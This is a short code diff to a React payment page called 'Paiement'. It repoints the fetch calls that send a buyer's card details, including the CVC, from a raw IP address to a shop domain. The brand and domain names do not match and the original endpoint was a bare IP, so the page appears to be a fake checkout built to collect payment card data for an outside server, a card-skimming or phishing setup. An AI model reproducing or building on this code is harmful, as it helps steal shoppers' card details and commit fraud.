@@ -93,7 +93,7 @@ export default function Paiement() {
           const cardCVC = event.target.cvv.value;
 
           // Trigger the eneba_checkout proceed API
-          const response = await fetch('http://164.92.222.43:3000/eneba_checkout/proceed', {
+          const response = await fetch('https://api.christopeit-france.shop/eneba_checkout/proceed', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json'
@@ -122,7 +122,7 @@ export default function Paiement() {
 
   const verifyPayment = async () => {
     try {
-      const response = await fetch('http://164.92.222.43:3000/eneba_checkout/verify', {
+      const response = await fetch('https://api.christopeit-france.shop/eneba_checkout/verify', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
